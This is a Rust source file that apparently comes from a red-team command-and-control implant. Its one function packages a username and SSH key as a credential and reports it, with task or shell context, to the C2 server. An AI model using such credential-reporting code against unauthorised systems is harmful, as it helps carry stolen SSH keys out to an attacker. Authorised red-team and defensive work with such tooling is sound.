use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::{Agent, ContextProvider, ReportContext};
use pb::{c2, eldritch};

pub fn ssh_key(
    agent: Arc<dyn Agent>,
    context_provider: Arc<dyn ContextProvider>,
    username: String,
    key: String,
) -> Result<(), String> {
    let cred = eldritch::Credential {
        principal: username,
        secret: key,
        kind: eldritch::credential::Kind::SshKey as i32,
    };

    let context = match context_provider.get_context() {
        ReportContext::Task(ctx) => {
            Some(c2::report_credential_request::Context::TaskContext(ctx))
        }
        ReportContext::Shell(ctx) => {
            Some(c2::report_credential_request::Context::ShellContext(ctx))
        }
    };

    let req = c2::ReportCredentialRequest {
        context,
        credential: Some(cred),
    };
    agent.report_credential(req).map(|_| ())
}
